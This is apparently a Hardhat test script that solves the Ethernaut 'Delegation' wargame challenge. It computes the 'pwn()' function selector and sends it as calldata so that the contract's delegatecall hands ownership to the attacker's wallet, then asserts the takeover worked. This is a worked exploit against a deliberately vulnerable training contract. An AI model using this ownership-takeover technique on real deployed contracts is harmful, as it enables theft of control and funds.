import { Delegate__factory, Delegation__factory } from "typechain-types"
import * as hardhat from "hardhat"
import { ethers } from "hardhat"
import path from "path"
import os from "os"
import * as dotenv from "dotenv"
import { BytesLike, Wallet } from "ethers"

const { expect } = require("chai")

const settings = dotenv.config({ path: path.join(os.homedir(), ".secrets", "ethernaut.env") }).parsed!!

/**
 * Returns an Ethereum function selector given the function signature
 * @param functionSignature The name of the function (and its arguments in parens)
 */
function ethereumFunctionSelector(functionSignature: string): BytesLike {
  const functionSignatureAsUtf8Bytes = hardhat.ethers.utils.toUtf8Bytes(functionSignature)
  const signatureCksum = ethers.utils.keccak256(functionSignatureAsUtf8Bytes)
  // end is 10 because we want the first four bytes (8 characters), and
  // signatureCksum starts with 0x (two characters).  arrayify expects
  // what ethers calls a DataHexStringOrArrayish https://docs.ethers.org/v5/api/utils/bytes/
  // which is something like 0xdd365b8b
  const firstFourBytesOfChecksum = signatureCksum.slice(0, 10)
  const result = hardhat.ethers.utils.arrayify(firstFourBytesOfChecksum)
  return result
}

describe("ethernaut", function() {
  it("should do the ethernaut challenge", async function() {
    const [initialDeployer] = await hardhat.ethers.getSigners()

    const testPrivateKey1Wallet = new Wallet(settings["privatekeyBsc"], hardhat.ethers.provider)

    // switch to using this when you're ready to finish the challenge on goerli
    const delegationContract = await Delegation__factory.connect(settings["instanceAddr"], testPrivateKey1Wallet)
    // const delegateContract = await new Delegate__factory(initialDeployer).deploy(testPrivateKey1Wallet.address)
    // const delegationContract = await new Delegation__factory(initialDeployer).deploy(delegateContract.address)
    console.log(JSON.stringify({
      testPrivateKey1WalletAddress: testPrivateKey1Wallet.address,
      delegationContractOwner: await delegationContract.owner(),
    }, undefined, 2))
    expect(testPrivateKey1Wallet.address).to.not.eq(await delegationContract.owner())
    const functionSelector = ethereumFunctionSelector("pwn()")
    console.log({balance: await hardhat.ethers.provider.getBalance(testPrivateKey1Wallet.address)})
    await testPrivateKey1Wallet.sendTransaction({
      to: delegationContract.address,
      value: 0,
      data: functionSelector,
      gasLimit: 2000000
    }).then(x => x.wait())
    console.log(JSON.stringify({
      testPrivateKey1WalletAddress: testPrivateKey1Wallet.address,
      delegationContractOwner: await delegationContract.owner(),
    }, undefined, 2))
    expect(testPrivateKey1Wallet.address).to.eq(await delegationContract.owner())
  })
})